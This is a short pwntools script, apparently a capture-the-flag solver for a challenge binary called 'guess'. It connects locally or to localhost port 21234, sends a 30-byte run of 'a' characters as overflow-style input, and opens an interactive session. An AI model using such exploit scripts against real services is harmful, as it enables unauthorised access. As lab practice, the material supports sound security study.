from pwn import *

context(os='linux', arch='amd64')
context.log_level = 'debug' # output verbose log

HOST = "localhost"
PORT = 21234
conn = None

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    conn = remote(HOST, PORT)
else:
    conn = process('../dist/guess')

conn.send(b"a"*30+b"\n\n")
conn.interactive()
